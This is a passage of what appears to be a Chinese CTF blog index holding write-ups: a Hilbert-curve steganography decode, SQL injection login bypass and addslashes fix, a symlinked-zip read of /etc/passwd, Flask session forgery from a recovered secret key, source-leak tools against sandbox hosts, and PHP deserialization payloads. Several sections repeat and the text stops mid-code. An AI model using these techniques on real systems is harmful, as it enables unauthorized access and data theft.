为了防止大家卡在这里，我在比赛中放出了另一个提示“不要埋头做，根据已有信息合理使用搜索引擎”。 这其实是一个大家都明白的道理，做CTF题目，尤其是做Misc题目的时候，善用搜索引擎是非常关键的一步。 但如果单纯搜索“希尔伯特”的话可能需要翻阅大量的网页，这里就需要大家有一些更加跳跃性的思维了。还记得这个题目的主体是什么吗？没错，是“三体”。那三体与希尔伯特这两个看似风马牛不相及的名词，会不会有某种联系呢？事实上，如果尝试以“三体 希尔伯特”作为关键词进行搜索， 很容易搜索引发这道题的出题思路的文章： https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg 这篇文章用文字和图片介绍了三个月前B站的一期关于降维打击的视频，视频当时还小火了一把。没错，降维打击！这不正是题目里的图片所讲述的故事。如果你看了文章会发现两张隐藏的图片都能在文章中的视频截图里找到。当发现这一点之后便可以确定，这个视频肯定跟这个题目有着密切的关系。而这个视频，讲的恰恰就是希尔伯特曲线。 下面要做的就是如何利用希尔伯特曲线把这里的二维数据转化成一维数据了。 不同维度的希尔伯特曲线是这样的： 因为这里我们得到的是128128的矩阵，128=2*7，所以我们应该使用7维的希尔伯特矩阵。 然后通过希尔伯特曲线的排列方式抽取各像素点的值，视频里已经给我们展示了，类似这样： 我们可以使用脚本把二维的01矩阵降维成一维的二进制流，便可以得到隐藏的文件。我在写脚本处理图片的时候用到了 https://github.com/galtay/hilbertcurve 这个库，实现的代码为： import numpy as npfrom PIL import Imagefrom hilbertcurve.hilbertcurve import HilbertCurvewith Image.open('threebody_new.bmp') as img: arr = np.asarray(img)arr = np.vectorize(lambda x: x\u00261)(arr[:,:,2])for x1 in range(np.size(arr,0)): if sum(arr[x1])\u003e0: breakfor x2 in reversed(range(np.size(arr,0))): if sum(arr[x2])\u003e0: breakfor y1 in range(np.size(arr,1)): if sum(arr[:,y1])\u003e0: breakfor y2 in reversed(range(np.size(arr,1))): if sum(arr[:,y2])\u003e0: breakarr = arr[x1:x2+1, y1:y2+1]hilbert_curve = HilbertCurve(7, 2)s = ''for i in range(np.size(arr)): [x,y] = hilbert_curve.point_from_distance(i) s += str(arr[127-y][x])with open('output', 'wb') as f: f.write(int(s,2).to_bytes(2048, 'big')) 这里的便是最后得到的文件，打开可以发现是一个C语言程序。编译并执行这个C语言程序，发的输出结果便为该C语言程序本身。 output 其实这种可以打印自身的程序学名叫Quine，2015年第一届强网杯的NESTING DOLL题目便是关于Qunie的，这里也是小小地纪念一下当年打CTF的时光。 不过如果对原始代码和程序输出的代码进行仔细比对的话可以发现，两者并不是完全相同的，在output的第11行后面多出了大片的空白字符，由空格和Tab构成。 通过把空格替换成0、Tab替换成1，可得到字符串 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101 这段二进制串还原便可得到Flag：flag{D1mEn5i0nAl_Pr061em} ","date":"2023-11-17","objectID":"/skynico2022.11/:5:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#misc希尔伯特的微笑"},{"categories":["wp"],"content":"\r[Pwn]真的nc上去就有flag了算是pwn签到题吧，直接nc ","date":"2023-11-17","objectID":"/skynico2022.11/:6:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#pwn真的nc上去就有flag了"},{"categories":["wp"],"content":"\r【Web福利题】某真实渗透场景我真的会谢！ 我以为会是SQL注入，直到hint放出。。。。。 我真的会谢。。。。 ","date":"2023-11-17","objectID":"/skynico2022.11/:7:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#web福利题某真实渗透场景"},{"categories":["wp"],"content":"\r[Reverse]what_is_pyc先百度啥叫pyc，什么是pyc文件 pyc是一种二进制文件，是由Python文件经过编译后所生成的文件，它是一种byte code，Python文件变成pyc文件后，加载的速度有所提高，而且pyc还是一种跨平台的字节码，由python的虚拟机来执行的，就类似于JAVA或者.NET的虚拟机的概念。pyc的内容与python的版本是相关的，不同版本编译后的pyc文件是不同的，例如2.5版本编译的是pyc文件，而2.4版本编译的python是无法执行的 就知道他是经过.py编译过来的就行，百度pyc反编译 发现python反编译在线网站https://tool.lu/pyc/ 生成然后复制，对脚本稍加修改，get flag ","date":"2023-11-17","objectID":"/skynico2022.11/:8:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#reversewhat_is_pyc"},{"categories":["wp"],"content":"\r[Forensic]芝麻开门！解开附件压缩包得到Windows7_research-cl1.vmdk是VM虚拟机磁盘镜像，用AXIOM Process进行取证，选择磁盘镜像取证，等软件读完数据直接检索pas，flag等关键词，直接get flag ","date":"2023-11-17","objectID":"/skynico2022.11/:9:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#forensic芝麻开门"},{"categories":["wp"],"content":"\r[Web]Intranet！\r放到浏览器，没查到啥，直接扫目录 dirsearch结果： get shell ","date":"2023-11-17","objectID":"/skynico2022.11/:10:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#webintranet"},{"categories":["web","awdp"],"content":"两道awdp-web加固题 ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:0:0","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#"},{"categories":["web","awdp"],"content":"\r[Ezsql]\r","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:1:0","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#ezsql"},{"categories":["web","awdp"],"content":"\r1.break首先进入靶机web页面 猜了弱口令都不对，尝试sql万能密码成功登录 用户名：admin' or 1=1# 密码：(填不填都行，填啥也行) 题目要求对页面存在的sql注入漏洞进行加固，即可取得flag ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:1:1","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#1break"},{"categories":["web","awdp"],"content":"\r2.fix根据题目给的地址端口以及用户名，ssh连接至靶机，进入/var/www/html/目录 在此处新建一个phpinfo.php并写入语句 \u003c?php phpinfo(); ?\u003e 访问phpinfo.php可以看到当前php版本为7.3.18 php中防止sql注入的函数无非就那么几个：（我所知道的） addslashes() mysql_real_escape_string() 在php5.5中已经弃用，并在php7中被删除 mysql_escape_string() PHP 4 \u003e= 4.0.3, PHP 5 在PHP7中，能用的只有addslashes() 故应在index.php中添加以下代码 $username = addslashes($username); $password = addslashes($password); 添加在此处： 随后进入check服务器/check目录进行check 通过之后访问/flag得到flag字符串 ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:1:2","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#2fix"},{"categories":["web","awdp"],"content":"\r[babypython]\r","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:2:0","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#babypython"},{"categories":["web","awdp"],"content":"\r1.break进入靶机web页面，是个上传界面，经过尝试后发现只能上传zip文件，猜测是通过上传软链接的压缩包来读取相关信息（压缩一个软链接，类似于windows下的快捷方式，然后网站后台会解压读取该软链接指向的服务器上的文件，就能达到读取任意文件的效果。） 在Linux环境下： ln -s /etc/passwd passwd zip -y passwd.zip passwd 生成了一个读取**/etc/passwd的zip软链接 随后上传我们得到的压缩包passwd.zip便可以在web页面看到回显的passwd文件信息 再来读取下app/uwsgi.ini uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议 读一下**/app/main.py** 最终找到源码文件：/app/y0u_found_it/y0u_found_main.py app.config[‘SECRET_KEY’] = str(random.random()*100) random.seed(uuid.getnode()) 设置随机数种子操作。 python random 生成的数是伪随机数 uuid.getnode() 这个函数可以获取网卡mac地址并转换成十进制数返回 通过读/sys/class/net/eth0/address文件得到mac地址，于是构造软链接、生成zip、上传看返回结果。 然后就是把mac地址处理下，转换成二进制，然后设置成seed，生成一下KEY import uuid import random mac = \"c6:98:94:10:39:c6\" temp = mac.split(':') #去掉\":\" temp = [int(i,16) for i in temp] #遍历mac temp = [bin(i).replace('0b','').zfill(8) for i in temp] #十六进制转二 temp = ''.join(temp) #得到的值赋给temp mac = int(temp,2) random.seed(mac) #将mac作为种子 randStr = str(random.random()*100) print(randStr) 得到KEY:68.61339598479617 同时根据页面提示，只有admin才能获得flag，尝试通过伪造session来伪造admin身份用flask-session-cookie-manager伪造session C:\\Users\\Scofield_Lee\\Desktop\\flask-session-cookie-manager\u003epython flask_session_cookie_manager3.py encode -s '68.61339598479617' -t \"{'username': 'admin'}\" eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w 得到session：eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:2:1","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#1break-1"},{"categories":["web","awdp"],"content":"\r2.fix。。。。。 ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:2:2","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#2fix-1"},{"categories":["web"],"content":"早期做CTFHub的入门题wp ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:0","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#"},{"categories":["web"],"content":"\r【目录遍历】emm挨着找吧 【PHPINFO】ctrl+f，搜索flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:1","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#目录遍历"},{"categories":["web"],"content":"\r【目录遍历】emm挨着找吧 【PHPINFO】ctrl+f，搜索flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:1","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#phpinfo"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#备份文件下载"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#网站源码"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#-bak文件"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#vim缓存"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#ds_store"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#git泄露"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#log"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#stash"},{"categories":["web"],"content":"\r【Git泄露】\r（log）利用GitHacker工具 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行： git log git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash 执行git stash apply或者git stash pop （index）直接githacker扒目录 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:3","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#index"},{"categories":["web"],"content":"\r【svn泄露】\r使用dvcs-ripper工具 ./rip-svn.pl -u http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/.svn 然后进入工具目录下的.svn文件夹 cat wc.db 内容太多，利用搜索 cat wc.db | grep -a flag ┌──(root㉿kali)-[/home/kali/dvcs-ripper/.svn] └─# cat wc.db |grep -a flag normaldir()infinity��å~%index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92���Á�root���X۾63▒ �����4 flag_1690618925.txt index.html index.html18925.txt 发现疑似文件，执行 curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/flag_1690618925.txt curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/index.html18925.txt 都返回404，根据index.html页面提示，flag在旧版本中， 在.svn中，cd pristine SVN泄露漏洞​ SVN 全称 Subversion ，是一个开放源代码的版本控制系统，Subversion 在 2000 年由 CollabNet Inc 开发，现在发展成为 Apache 软件基金会的一个项目，同样是一个丰富的开发者和用户社区的一部分。 SVN泄露漏洞验证方式：intitle:“index of/.svn” wc.db文件：用SQLiteStudio软件打开 wc.db文件，可以看到 NODES 表，遍历这个表里的每一行，就可以下载到整个项目里的代码了，而且还能得到对应的真实文件名。 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:4","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#svn泄露"},{"categories":["web"],"content":"\r【svn泄露】\r使用dvcs-ripper工具 ./rip-svn.pl -u http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/.svn 然后进入工具目录下的.svn文件夹 cat wc.db 内容太多，利用搜索 cat wc.db | grep -a flag ┌──(root㉿kali)-[/home/kali/dvcs-ripper/.svn] └─# cat wc.db |grep -a flag normaldir()infinity��å~%index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92���Á�root���X۾63▒ �����4 flag_1690618925.txt index.html index.html18925.txt 发现疑似文件，执行 curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/flag_1690618925.txt curl http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/index.html18925.txt 都返回404，根据index.html页面提示，flag在旧版本中， 在.svn中，cd pristine SVN泄露漏洞​ SVN 全称 Subversion ，是一个开放源代码的版本控制系统，Subversion 在 2000 年由 CollabNet Inc 开发，现在发展成为 Apache 软件基金会的一个项目，同样是一个丰富的开发者和用户社区的一部分。 SVN泄露漏洞验证方式：intitle:“index of/.svn” wc.db文件：用SQLiteStudio软件打开 wc.db文件，可以看到 NODES 表，遍历这个表里的每一行，就可以下载到整个项目里的代码了，而且还能得到对应的真实文件名。 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:4","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#svn泄露漏洞"},{"categories":["web"],"content":"\r【HG泄露】\r使用 dvcs-ripper 工具下载泄露的网站目录 ./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg 使用工具过程中出现了一些错误，导致网站源代码没有完整下载。正如网页显示内容中的提示所说，不好使的情况下，试着手工解决。 ┌──(root㉿kali)-[/home/kali/dvcs-ripper] └─# tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate 通过正则搜索flag相关的文件 然后执行curl HG泄露漏洞​ Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。 在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。\r常规文件robots.txt：记录一些目录和CMS版本信息 readme.md：记录CMS版本信息，有的甚至是GitHub地址 www.zip/rar/tar.gz：往往是网站的备份源码 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:5","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#hg泄露"},{"categories":["web"],"content":"\r【HG泄露】\r使用 dvcs-ripper 工具下载泄露的网站目录 ./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg 使用工具过程中出现了一些错误，导致网站源代码没有完整下载。正如网页显示内容中的提示所说，不好使的情况下，试着手工解决。 ┌──(root㉿kali)-[/home/kali/dvcs-ripper] └─# tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate 通过正则搜索flag相关的文件 然后执行curl HG泄露漏洞​ Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。 在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。\r常规文件robots.txt：记录一些目录和CMS版本信息 readme.md：记录CMS版本信息，有的甚至是GitHub地址 www.zip/rar/tar.gz：往往是网站的备份源码 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:5","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#hg泄露漏洞"},{"categories":["web"],"content":"\r【HG泄露】\r使用 dvcs-ripper 工具下载泄露的网站目录 ./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg 使用工具过程中出现了一些错误，导致网站源代码没有完整下载。正如网页显示内容中的提示所说，不好使的情况下，试着手工解决。 ┌──(root㉿kali)-[/home/kali/dvcs-ripper] └─# tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate 通过正则搜索flag相关的文件 然后执行curl HG泄露漏洞​ Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。 在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。\r常规文件robots.txt：记录一些目录和CMS版本信息 readme.md：记录CMS版本信息，有的甚至是GitHub地址 www.zip/rar/tar.gz：往往是网站的备份源码 ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:5","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#常规文件"},{"categories":["CTF","web"],"content":"ctfshow反序列化专题 PHP面向对象编程： https://www.runoob.com/php./php-oop.html ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#"},{"categories":["CTF","web"],"content":"\r总结：Lethe’s Blog谈一谈PHP反序列化 反序列化中常见的魔术方法： __wakeup() //执行unserialize()时，先会调用这个函数 __sleep() //执行serialize()时，先会调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#总结"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web254] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ if($this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p){ $this-\u003eisVip=true; } return $this-\u003eisVip; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = new ctfShowUser(); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } GET传参 username=xxxxxx\u0026password=xxxxxx ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web254"},{"categories":["CTF","web"],"content":"\r[web255] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 生成序列化内容 \u003c?php class ctfShowUser{ public $isVip=True; } $user = urlencode(serialize(new ctfShowUser())); echo $user; ?\u003e GET传参username和password内容，Cookie传递url编码后public $isVip=True;并序列化的参数 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web255"},{"categories":["CTF","web"],"content":"\r[web256] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; if($this-\u003eusername!==$this-\u003epassword){ echo \"your flag is \".$flag; } }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); 